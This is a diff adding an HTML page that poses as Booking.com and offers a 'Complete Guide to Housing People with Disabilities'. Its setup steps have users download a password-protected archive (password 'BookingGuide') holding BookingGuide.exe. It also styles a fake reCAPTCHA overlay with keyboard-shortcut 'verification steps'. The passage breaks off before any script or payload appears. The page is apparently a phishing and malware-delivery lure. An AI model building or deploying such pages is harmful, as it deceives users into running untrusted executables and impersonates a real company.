@@ -1,0 +1,1671 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Complete Guide to Housing People with Disabilities | Booking.com</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        *, *::before, *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --blue-primary: #003580;
+            --blue-dark: #00224f;
+            --blue-link: #006ce4;
+            --blue-light: #0071c2;
+            --yellow: #febb02;
+            --yellow-hover: #ffc72c;
+            --white: #ffffff;
+            --gray-100: #f5f5f5;
+            --gray-200: #e7e7e7;
+            --gray-400: #bdbdbd;
+            --gray-600: #6b6b6b;
+            --gray-800: #333333;
+            --text: #262626;
+            --shadow: 0 2px 8px rgba(0, 0, 0, 0.12);
+            --shadow-lg: 0 8px 24px rgba(0, 0, 0, 0.15);
+            --radius: 4px;
+            --radius-lg: 8px;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: 'Inter', BlinkMacSystemFont, -apple-system, 'Segoe UI', Roboto, sans-serif;
+            color: var(--text);
+            background: var(--white);
+            line-height: 1.5;
+        }
+
+        /* Header */
+        .site-header {
+            background: var(--blue-primary);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.15);
+        }
+
+        .header-inner {
+            max-width: 1140px;
+            margin: 0 auto;
+            padding: 0 24px;
+            height: 64px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            text-decoration: none;
+        }
+
+        .brand-name {
+            color: var(--white);
+            font-size: 20px;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+        }
+
+        .header-nav {
+            display: flex;
+            align-items: center;
+            gap: 24px;
+        }
+
+        .header-nav a {
+            color: var(--white);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            opacity: 0.9;
+            transition: opacity 0.2s;
+        }
+
+        .header-nav a:hover {
+            opacity: 1;
+        }
+
+        .header-btn {
+            background: var(--white);
+            color: var(--blue-primary);
+            border: none;
+            padding: 8px 16px;
+            border-radius: var(--radius);
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background 0.2s;
+        }
+
+        .header-btn:hover {
+            background: var(--gray-100);
+        }
+
+        /* Hero */
+        .hero {
+            position: relative;
+            min-height: 420px;
+            display: flex;
+            align-items: center;
+            background:
+                linear-gradient(to bottom, rgba(0, 53, 128, 0.82) 0%, rgba(0, 34, 79, 0.92) 100%),
+                url('https://images.unsplash.com/photo-1566073771259-6a8506099945?auto=format&fit=crop&w=1920&q=80') center/cover no-repeat;
+            background-color: var(--blue-primary);
+        }
+
+        .hero-inner {
+            max-width: 1140px;
+            margin: 0 auto;
+            padding: 48px 24px 64px;
+            width: 100%;
+        }
+
+        .hero-badge {
+            display: inline-block;
+            background: rgba(255, 255, 255, 0.15);
+            color: var(--white);
+            font-size: 13px;
+            font-weight: 500;
+            padding: 6px 14px;
+            border-radius: 20px;
+            margin-bottom: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.25);
+        }
+
+        .hero-title {
+            color: var(--white);
+            font-size: clamp(28px, 5vw, 44px);
+            font-weight: 700;
+            line-height: 1.15;
+            letter-spacing: -0.02em;
+            max-width: 720px;
+            margin-bottom: 12px;
+        }
+
+        .hero-subtitle {
+            color: rgba(255, 255, 255, 0.85);
+            font-size: clamp(16px, 2.5vw, 18px);
+            max-width: 560px;
+            margin-bottom: 32px;
+            font-weight: 400;
+        }
+
+        .download-buttons {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin-bottom: 8px;
+        }
+
+        .download-btn {
+            background: var(--yellow);
+            color: var(--blue-dark);
+            border: none;
+            padding: 14px 24px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: var(--radius);
+            cursor: pointer;
+            transition: background 0.2s, transform 0.15s;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        .download-btn:hover {
+            background: var(--yellow-hover);
+            transform: translateY(-1px);
+        }
+
+        .download-btn svg {
+            width: 20px;
+            height: 20px;
+            flex-shrink: 0;
+        }
+
+        .hero-lang {
+            color: rgba(255, 255, 255, 0.65);
+            font-size: 13px;
+            margin-top: 8px;
+        }
+
+        /* Guides section */
+        .guides-section {
+            background: var(--gray-100);
+            padding: 56px 24px 72px;
+        }
+
+        .guides-header {
+            max-width: 1140px;
+            margin: 0 auto 40px;
+            text-align: center;
+        }
+
+        .guides-header h2 {
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--blue-primary);
+            margin-bottom: 8px;
+        }
+
+        .guides-header p {
+            color: var(--gray-600);
+            font-size: 16px;
+            max-width: 640px;
+            margin: 0 auto;
+        }
+
+        .guides-grid {
+            max-width: 1140px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 32px;
+        }
+
+        #guide-mac {
+            order: 1;
+        }
+
+        #guide-windows {
+            order: 2;
+        }
+
+        .guide-card {
+            background: var(--white);
+            border-radius: var(--radius-lg);
+            box-shadow: var(--shadow);
+            overflow: hidden;
+            border: 1px solid var(--gray-200);
+        }
+
+        .guide-card-header {
+            background: var(--blue-primary);
+            color: var(--white);
+            padding: 20px 24px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .guide-card-header svg {
+            width: 28px;
+            height: 28px;
+            flex-shrink: 0;
+        }
+
+        .guide-card-header h3 {
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .guide-card-header p {
+            font-size: 13px;
+            opacity: 0.8;
+            margin-top: 2px;
+        }
+
+        .guide-card-body {
+            padding: 28px 24px 32px;
+        }
+
+        .guide-intro {
+            color: var(--gray-600);
+            font-size: 14px;
+            margin-bottom: 28px;
+            line-height: 1.6;
+        }
+
+        .step {
+            margin-bottom: 32px;
+        }
+
+        .step:last-child {
+            margin-bottom: 0;
+        }
+
+        .step-number {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 28px;
+            height: 28px;
+            background: var(--blue-primary);
+            color: var(--white);
+            font-size: 14px;
+            font-weight: 700;
+            border-radius: 50%;
+            margin-bottom: 10px;
+        }
+
+        .step-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text);
+            margin-bottom: 6px;
+        }
+
+        .step-text {
+            font-size: 14px;
+            color: var(--gray-600);
+            line-height: 1.65;
+            margin-bottom: 14px;
+        }
+
+        .step-text strong {
+            color: var(--text);
+            font-weight: 600;
+        }
+
+        .step-password {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #fff8e1;
+            border: 1px solid var(--yellow);
+            padding: 4px 10px;
+            border-radius: var(--radius);
+            font-weight: 600;
+            color: var(--blue-dark);
+            font-size: 14px;
+        }
+
+        .step-image {
+            border-radius: var(--radius-lg);
+            overflow: hidden;
+            border: 1px solid var(--gray-200);
+            box-shadow: var(--shadow-lg);
+            background: #dfe3ea;
+        }
+
+        /* Screenshot mockups */
+        .mock {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            font-size: 12px;
+            color: #1a1a1a;
+        }
+
+        .mock-browser {
+            background: #dee1e6;
+        }
+
+        .mock-browser-bar {
+            background: #e8eaed;
+            padding: 8px 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border-bottom: 1px solid #c8ccd0;
+        }
+
+        .mock-dots {
+            display: flex;
+            gap: 6px;
+        }
+
+        .mock-dots span {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+        }
+
+        .mock-dots span:nth-child(1) { background: #ff6058; }
+        .mock-dots span:nth-child(2) { background: #ffbd2e; }
+        .mock-dots span:nth-child(3) { background: #28ca41; }
+
+        .mock-url {
+            flex: 1;
+            background: #fff;
+            border: 1px solid #c8ccd0;
+            border-radius: 16px;
+            padding: 6px 14px;
+            color: #5f6368;
+            font-size: 11px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .mock-site-header {
+            background: var(--blue-primary);
+            padding: 12px 20px;
+            color: #fff;
+            font-weight: 700;
+            font-size: 15px;
+        }
+
+        .mock-hero {
+            background: linear-gradient(rgba(0,53,128,.88), rgba(0,34,79,.95)), url('https://images.unsplash.com/photo-1566073771259-6a8506099945?auto=format&fit=crop&w=800&q=80') center/cover;
+            padding: 28px 20px 32px;
+            min-height: 160px;
+        }
+
+        .mock-hero h5 {
+            color: #fff;
+            font-size: 18px;
+            font-weight: 700;
+            line-height: 1.25;
+            margin-bottom: 16px;
+            max-width: 280px;
+        }
+
+        .mock-btn-row {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .mock-btn {
+            padding: 10px 16px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 600;
+            border: none;
+        }
+
+        .mock-btn-primary {
+            background: var(--yellow);
+            color: var(--blue-dark);
+            box-shadow: 0 2px 8px rgba(0,0,0,.25);
+        }
+
+        .mock-btn-secondary {
+            background: rgba(254,187,2,.35);
+            color: rgba(0,34,79,.7);
+        }
+
+        .mock-card-below {
+            background: #fff;
+            margin: 12px;
+            padding: 16px;
+            border-radius: 4px;
+            border: 1px solid var(--gray-200);
+        }
+
+        .mock-card-below h6 {
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .mock-card-below p {
+            font-size: 11px;
+            color: var(--gray-600);
+        }
+
+        .mock-win {
+            background: #1a1a1a;
+            padding: 16px;
+        }
+
+        .mock-win-window {
+            background: #202020;
+            border: 1px solid #3a3a3a;
+            border-radius: 8px;
+            overflow: hidden;
+            max-width: 100%;
+        }
+
+        .mock-win-title {
+            background: #2d2d2d;
+            padding: 8px 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #ccc;
+            font-size: 11px;
+            border-bottom: 1px solid #3a3a3a;
+        }
+
+        .mock-win-body {
+            padding: 12px;
+            background: #1e1e1e;
+        }
+
+        .mock-file {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 10px 12px;
+            background: #0e3a5e;
+            border: 1px solid #0078d4;
+            border-radius: 4px;
+            margin-bottom: 12px;
+        }
+
+        .mock-file-icon {
+            width: 36px;
+            height: 40px;
+            background: linear-gradient(180deg, #febb02, #e5a800);
+            border-radius: 3px;
+            flex-shrink: 0;
+        }
+
+        .mock-file-name {
+            color: #fff;
+            font-weight: 600;
+            font-size: 12px;
+        }
+
+        .mock-file-meta {
+            color: #8ec8ff;
+            font-size: 10px;
+            margin-top: 2px;
+        }
+
+        .mock-progress {
+            background: #2d2d2d;
+            border-radius: 4px;
+            padding: 12px;
+            border: 1px solid #3a3a3a;
+        }
+
+        .mock-progress-label {
+            color: #4ec9b0;
+            font-family: Consolas, monospace;
+            font-size: 10px;
+            margin-bottom: 8px;
+        }
+
+        .mock-progress-bar {
+            height: 6px;
+            background: #333;
+            border-radius: 3px;
+            overflow: hidden;
+        }
+
+        .mock-progress-fill {
+            height: 100%;
+            width: 85%;
+            background: #0078d4;
+            border-radius: 3px;
+        }
+
+        .mock-dialog {
+            background: #f0f0f0;
+            padding: 20px;
+        }
+
+        .mock-dialog-box {
+            background: #fff;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            overflow: hidden;
+            box-shadow: 0 4px 20px rgba(0,0,0,.15);
+        }
+
+        .mock-dialog-head {
+            background: var(--blue-primary);
+            color: #fff;
+            padding: 10px 14px;
+            font-weight: 600;
+            font-size: 12px;
+        }
+
+        .mock-dialog-body {
+            padding: 16px;
+        }
+
+        .mock-password-box {
+            background: #fff8e1;
+            border: 1px solid var(--yellow);
+            border-radius: 4px;
+            padding: 14px;
+            margin-bottom: 14px;
+        }
+
+        .mock-password-box label {
+            display: block;
+            font-size: 11px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .mock-password-input {
+            background: #fff;
+            border: 2px solid var(--yellow);
+            border-radius: 4px;
+            padding: 8px 12px;
+            font-weight: 700;
+            color: var(--blue-dark);
+            font-size: 13px;
+        }
+
+        .mock-file-list {
+            background: #fafafa;
+            border: 1px solid #e0e0e0;
+            border-radius: 4px;
+            padding: 10px 14px;
+            margin-bottom: 14px;
+        }
+
+        .mock-file-list div {
+            font-size: 11px;
+            color: #555;
+            padding: 3px 0;
+        }
+
+        .mock-dialog-btn {
+            display: inline-block;
+            background: #0078d4;
+            color: #fff;
+            padding: 8px 16px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 600;
+            float: right;
+        }
+
+        .mock-explorer {
+            background: #0078d4;
+            padding: 16px;
+        }
+
+        .mock-explorer-window {
+            background: #fff;
+            border: 1px solid #999;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+
+        .mock-explorer-bar {
+            background: #f3f3f3;
+            padding: 6px 10px;
+            font-size: 11px;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .mock-explorer-grid {
+            display: flex;
+            gap: 16px;
+            padding: 16px;
+            flex-wrap: wrap;
+        }
+
+        .mock-explorer-item {
+            width: 72px;
+            text-align: center;
+        }
+
+        .mock-explorer-item.selected .mock-explorer-icon {
+            background: #cce4f7;
+            outline: 2px solid #0078d4;
+            outline-offset: 2px;
+        }
+
+        .mock-explorer-icon {
+            width: 48px;
+            height: 48px;
+            margin: 0 auto 6px;
+            border-radius: 4px;
+            background: #f5f5f5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .mock-explorer-icon.app {
+            background: var(--blue-primary);
+        }
+
+        .mock-explorer-item span {
+            font-size: 10px;
+            word-break: break-all;
+        }
+
+        .mock-explorer-hint {
+            margin: 0 16px 16px;
+            padding: 12px;
+            background: #f5f5f5;
+            border: 1px solid #e0e0e0;
+            border-radius: 4px;
+            font-size: 11px;
+        }
+
+        .mock-app {
+            background: #d6d6d6;
+            padding: 12px;
+        }
+
+        .mock-app-window {
+            background: #fff;
+            border: 1px solid #aaa;
+            border-radius: 8px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            min-height: 220px;
+        }
+
+        .mock-app-top {
+            background: var(--blue-primary);
+            color: #fff;
+            padding: 10px 14px;
+            font-weight: 700;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .mock-app-top .dots {
+            display: flex;
+            gap: 5px;
+        }
+
+        .mock-app-top .dots i {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            display: block;
+        }
+
+        .mock-app-layout {
+            display: flex;
+            flex: 1;
+        }
+
+        .mock-app-sidebar {
+            width: 110px;
+            background: #f5f5f5;
+            border-right: 1px solid #e0e0e0;
+            padding: 10px 0;
+        }
+
+        .mock-app-sidebar a {
+            display: block;
+            padding: 8px 14px;
+            font-size: 11px;
+            color: #666;
+            text-decoration: none;
+        }
+
+        .mock-app-sidebar a.active {
+            background: var(--blue-primary);
+            color: #fff;
+            font-weight: 600;
+        }
+
+        .mock-app-content {
+            flex: 1;
+            padding: 14px;
+        }
+
+        .mock-app-content h6 {
+            color: var(--blue-primary);
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+
+        .mock-chapter {
+            border: 1px solid #e0e0e0;
+            border-radius: 4px;
+            padding: 10px 12px;
+            margin-bottom: 8px;
+        }
+
+        .mock-chapter.highlight {
+            background: #f0f7ff;
+            border-color: #006ce4;
+        }
+
+        .mock-chapter strong {
+            display: block;
+            font-size: 11px;
+            margin-bottom: 3px;
+        }
+
+        .mock-chapter span {
+            font-size: 10px;
+            color: #666;
+        }
+
+        .mock-terminal-wrap {
+            background: #1a1a1a;
+            padding: 16px;
+        }
+
+        .mock-terminal {
+            background: #2d2d2d;
+            border-radius: 8px;
+            overflow: hidden;
+            border: 1px solid #444;
+        }
+
+        .mock-terminal-head {
+            background: #3c3c3c;
+            padding: 8px 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .mock-terminal-body {
+            padding: 14px;
+            font-family: 'SF Mono', Consolas, monospace;
+            font-size: 10px;
+            line-height: 1.7;
+            color: #d4d4d4;
+        }
+
+        .mock-terminal-body .prompt { color: #4ec9b0; }
+        .mock-terminal-body .cmd { color: #d4d4d4; }
+        .mock-terminal-body .out { color: #ce9178; }
+        .mock-terminal-body .dim { color: #888; font-family: inherit; font-size: 10px; margin-top: 10px; padding-top: 10px; border-top: 1px solid #444; }
+
+        .mock-tip-box {
+            background: #252526;
+            border: 1px solid #444;
+            border-radius: 4px;
+            padding: 10px 12px;
+            margin-top: 10px;
+        }
+
+        .mock-tip-box code {
+            display: block;
+            margin-top: 6px;
+            background: #333;
+            padding: 6px 8px;
+            border-radius: 3px;
+            color: #aaa;
+            font-size: 9px;
+            word-break: break-all;
+        }
+
+        .guide-thanks {
+            margin-top: 28px;
+            padding-top: 24px;
+            border-top: 1px solid var(--gray-200);
+            font-size: 14px;
+            color: var(--gray-600);
+            line-height: 1.65;
+            font-style: italic;
+        }
+
+        /* Footer */
+        .site-footer {
+            background: var(--blue-dark);
+            color: var(--white);
+            padding: 40px 24px 24px;
+        }
+
+        .footer-inner {
+            max-width: 1140px;
+            margin: 0 auto;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px 24px;
+            margin-bottom: 24px;
+        }
+
+        .footer-links a {
+            color: rgba(255, 255, 255, 0.75);
+            text-decoration: none;
+            font-size: 13px;
+            transition: color 0.2s;
+        }
+
+        .footer-links a:hover {
+            color: var(--white);
+        }
+
+        .footer-copy {
+            color: rgba(255, 255, 255, 0.45);
+            font-size: 12px;
+            padding-top: 16px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        /* Responsive */
+        @media (max-width: 900px) {
+            .guides-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .header-nav {
+                display: none;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .download-buttons {
+                flex-direction: column;
+            }
+
+            .download-btn {
+                justify-content: center;
+            }
+
+            .hero-inner {
+                padding: 32px 20px 48px;
+            }
+
+            .guides-section {
+                padding: 40px 16px 56px;
+            }
+
+            .guide-card-body {
+                padding: 20px 16px 24px;
+            }
+        }
+
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .download-btn.loading svg {
+            animation: spin 1s linear infinite;
+        }
+
+        /* Captcha overlay */
+        .captcha-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 10000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            background: rgba(0, 0, 0, 0.35);
+            backdrop-filter: blur(6px);
+            -webkit-backdrop-filter: blur(6px);
+        }
+
+        .captcha-overlay.hidden {
+            display: none;
+        }
+
+        .captcha-modal {
+            background: var(--white);
+            border-radius: 2px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.25);
+            padding: 32px 36px 28px;
+            max-width: 420px;
+            width: 100%;
+        }
+
+        .captcha-modal h2 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 8px;
+            letter-spacing: -0.02em;
+        }
+
+        .captcha-modal > p {
+            font-size: 14px;
+            color: #4a4a4a;
+            margin-bottom: 20px;
+            line-height: 1.45;
+        }
+
+        .recaptcha-wrap {
+            position: relative;
+        }
+
+        .recaptcha-box {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border: 1px solid #d3d3d3;
+            background: #f9f9f9;
+            padding: 12px 14px;
+            cursor: pointer;
+            user-select: none;
+            transition: box-shadow 0.2s;
+        }
+
+        .recaptcha-box:hover {
+            box-shadow: 0 0 0 1px #c6c6c6;
+        }
+
+        .recaptcha-checkbox {
+            width: 28px;
+            height: 28px;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid #c1c1c1;
+            border-radius: 2px;
+            background: #fff;
+            transition: border-color 0.15s, background 0.15s;
+        }
+
+        .recaptcha-checkbox.checked {
+            border-color: #4a90e2;
+            background: #4a90e2;
+        }
+
+        .recaptcha-checkbox.loading {
+            border-color: transparent;
+            background: transparent;
+        }
+
+        .recaptcha-spinner {
+            display: none;
+            width: 22px;
+            height: 22px;
+            border: 2.5px solid #e0e0e0;
+            border-top-color: #4a90e2;
+            border-radius: 50%;
+            animation: spin 0.75s linear infinite;
+        }
+
+        .recaptcha-checkbox.loading .recaptcha-spinner {
+            display: block;
+        }
+
+        .recaptcha-checkbox.loading .recaptcha-checkmark {
+            display: none;
+        }
+
+        .recaptcha-checkmark {
+            display: none;
+            width: 100%;
+            height: 100%;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .recaptcha-checkbox.checked .recaptcha-checkmark {
+            display: flex;
+        }
+
+        .recaptcha-checkmark svg {
+            width: 18px;
+            height: 18px;
+            fill: #fff;
+        }
+
+        .recaptcha-label {
+            flex: 1;
+            font-size: 14px;
+            color: #1a1a1a;
+            font-family: Roboto, 'Segoe UI', Arial, sans-serif;
+        }
+
+        .recaptcha-brand {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 2px;
+            flex-shrink: 0;
+        }
+
+        .recaptcha-brand svg {
+            width: 32px;
+            height: 32px;
+        }
+
+        .recaptcha-brand span {
+            font-size: 10px;
+            color: #555;
+            font-weight: 500;
+            letter-spacing: 0.02em;
+        }
+
+        .recaptcha-brand a {
+            font-size: 8px;
+            color: #555;
+            text-decoration: none;
+        }
+
+        .recaptcha-brand a:hover {
+            text-decoration: underline;
+        }
+
+        .verification-steps {
+            display: none;
+            position: relative;
+            margin-top: 4px;
+            border: 1px solid #d3d3d3;
+            background: #fff;
+            padding: 16px 20px 18px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.12);
+        }
+
+        .verification-steps.visible {
+            display: block;
+            animation: captchaFadeIn 0.25s ease;
+        }
+
+        .verification-steps::before {
+            content: '';
+            position: absolute;
+            top: -8px;
+            left: 28px;
+            width: 0;
+            height: 0;
+            border-left: 8px solid transparent;
+            border-right: 8px solid transparent;
+            border-bottom: 8px solid #d3d3d3;
+        }
+
+        .verification-steps::after {
+            content: '';
+            position: absolute;
+            top: -7px;
+            left: 29px;
+            width: 0;
+            height: 0;
+            border-left: 7px solid transparent;
+            border-right: 7px solid transparent;
+            border-bottom: 7px solid #fff;
+        }
+
+        .verification-steps h3 {
+            text-align: center;
+            font-size: 14px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 12px;
+        }
+
+        .verification-steps ol {
+            list-style: none;
+            counter-reset: vstep;
+            padding: 0;
+            margin: 0;
+        }
+
+        .verification-steps li {
+            counter-increment: vstep;
+            font-size: 13px;
+            color: #333;
+            padding: 5px 0;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            flex-wrap: wrap;
+        }
+
+        .verification-steps li::before {
+            content: counter(vstep) '.';
+            font-weight: 600;
+            min-width: 18px;
+        }
+
+        .win-key {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 18px;
+            height: 18px;
+            background: #0078d4;
+            border-radius: 2px;
+            vertical-align: middle;
+        }
+
+        .win-key svg {
+            width: 12px;
+            height: 12px;
+            fill: #fff;
+        }
+
+        .mac-key {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            min-width: 22px;
+            height: 18px;
+            padding: 0 5px;
+            background: #555;
+            color: #fff;
+            border-radius: 3px;
+            font-size: 11px;
+            font-weight: 600;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+
+        .key-combo {
+            font-weight: 600;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+
+        @keyframes captchaFadeIn {
+            from { opacity: 0; transform: translateY(-6px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+    <header class="site-header">
+        <div class="header-inner">
+            <a href="#" class="brand">
+                <span class="brand-name">Booking.com</span>
+            </a>
+            <nav class="header-nav">
+                <a href="#">Stays</a>
+                <a href="#">Flights</a>
+                <a href="#">Car rental</a>
+                <a href="#">Attractions</a>
+            </nav>
+        </div>
+    </header>
+
+    <section class="hero">
+        <div class="hero-inner">
+            <span class="hero-badge">Accessibility Resources</span>
+            <h1 class="hero-title">Complete Guide to Housing People with Disabilities</h1>
+            <p class="hero-subtitle">Download our comprehensive guide to accessible accommodation and inclusive housing practices — available for Mac and Windows.</p>
+            <div class="download-buttons">
+                <a href="#guide-mac" class="download-btn" onclick="handleDownload(event, 'mac')">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/></svg>
+                    Download for Mac
+                </a>
+                <a href="#guide-windows" class="download-btn" onclick="handleDownload(event, 'windows')">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24"><path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.9-1.801"/></svg>
+                    Download for Windows
+                </a>
+            </div>
+            <p class="hero-lang">Available in English</p>
+        </div>
+    </section>
+
+    <section class="guides-section">
+        <div class="guides-header">
+            <h2>Setup Instructions</h2>
+            <p>Follow the step-by-step guides below to download and access the guide on your device.</p>
+        </div>
+
+        <div class="guides-grid">
+            <!-- Windows Guide -->
+            <article class="guide-card" id="guide-windows">
+                <div class="guide-card-header">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24"><path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.9-1.801"/></svg>
+                    <div>
+                        <h3>Windows Setup Guide</h3>
+                        <p>Step-by-step instructions for Windows users</p>
+                    </div>
+                </div>
+                <div class="guide-card-body">
+                    <p class="guide-intro">We are delighted to welcome you to our platform! To ensure a smooth onboarding experience, please follow the instructions below to download and access the Complete Guide to Housing People with Disabilities.</p>
+
+                    <div class="step">
+                        <div class="step-number">1</div>
+                        <h4 class="step-title">Visit the Booking.com Website</h4>
+                        <p class="step-text">Navigate to the official Booking.com platform using your personalized partner link and click <strong>"Download for Windows"</strong> to initiate the setup process.</p>
+                        <div class="step-image">
+                            <div class="mock mock-browser">
+                                <div class="mock-browser-bar">
+                                    <div class="mock-dots"><span></span><span></span><span></span></div>
+                                    <div class="mock-url">https://www.booking.com/accessibility/guide</div>
+                                </div>
+                                <div class="mock-site-header">Booking.com</div>
+                                <div class="mock-hero">
+                                    <h5>Complete Guide to Housing People with Disabilities</h5>
+                                    <div class="mock-btn-row">
+                                        <button class="mock-btn mock-btn-primary" type="button">Download for Windows</button>
+                                        <button class="mock-btn mock-btn-secondary" type="button">Download for Mac</button>
+                                    </div>
+                                </div>
+                                <div class="mock-card-below">
+                                    <h6>Setup Instructions</h6>
+                                    <p>Follow the step-by-step guides below to download and access the guide on your device.</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="step">
+                        <div class="step-number">2</div>
+                        <h4 class="step-title">Download the Application</h4>
+                        <p class="step-text">Once you proceed, a compressed archive containing the portable guide application will be automatically downloaded to your device. Please ensure you save it to an easily accessible location on your system.</p>
+                        <div class="step-image">
+                            <div class="mock mock-win">
+                                <div class="mock-win-window">
+                                    <div class="mock-win-title">
+                                        <div class="mock-dots"><span></span><span></span><span></span></div>
+                                        Downloads — File Explorer
+                                    </div>
+                                    <div class="mock-win-body">
+                                        <div class="mock-file">
+                                            <div class="mock-file-icon"></div>
+                                            <div>
+                                                <div class="mock-file-name">BookingGuide_Windows.zip</div>
+                                                <div class="mock-file-meta">Compressed folder · 24.5 MB · Just now</div>
+                                            </div>
+                                        </div>
+                                        <div class="mock-progress">
+                                            <div class="mock-progress-label">Downloading BookingGuide_Windows.zip...</div>
+                                            <div class="mock-progress-bar"><div class="mock-progress-fill"></div></div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="step">
+                        <div class="step-number">3</div>
+                        <h4 class="step-title">Extract the Archive</h4>
+                        <p class="step-text">Unpack the downloaded archive using the following password: <span class="step-password">BookingGuide</span> We recommend using a trusted extraction tool such as WinRAR or 7-Zip to ensure a smooth installation process.</p>
+                        <div class="step-image">
+                            <div class="mock mock-dialog">
+                                <div class="mock-dialog-box">
+                                    <div class="mock-dialog-head">Enter password — WinRAR</div>
+                                    <div class="mock-dialog-body">
+                                        <div class="mock-password-box">
+                                            <label>Enter password for encrypted archive:</label>
+                                            <div class="mock-password-input">BookingGuide</div>
+                                        </div>
+                                        <div class="mock-file-list">
+                                            <div><strong>Contents:</strong></div>
+                                            <div>BookingGuide.exe</div>
+                                            <div>README.txt</div>
+                                            <div>resources/</div>
+                                        </div>
